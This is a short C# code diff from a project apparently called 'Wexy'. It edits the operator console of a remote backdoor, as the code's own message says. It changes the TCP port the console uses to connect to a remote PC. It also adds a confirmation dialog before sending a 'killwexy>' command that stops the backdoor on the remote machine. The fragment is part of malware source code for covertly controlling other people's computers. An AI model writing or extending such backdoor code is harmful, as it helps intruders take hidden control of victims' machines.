@@ -176,7 +176,7 @@ namespace Wexy
             
             try
             {
-                client.Connect(remotepcIp, 2000);
+                client.Connect(remotepcIp, 1000);
                 isConnected = true;
                 Writer = client.GetStream();
                 Receiver = client.GetStream();
@@ -289,8 +289,14 @@ namespace Wexy
 
         private void btn_quit_Click(object sender, EventArgs e)
         {
-            SendCommand("killwexy>");
-            //Application.Exit();
+            DialogResult dr = new DialogResult();
+            ConfirmForm frm = new ConfirmForm();
+            dr = frm.ShowDialog();
+            if (dr == DialogResult.Yes)
+            {
+                SendCommand("killwexy>");
+                MessageBox.Show("The backdoor stopped running on the remote machine.");
+            }               
         }
     }
 }
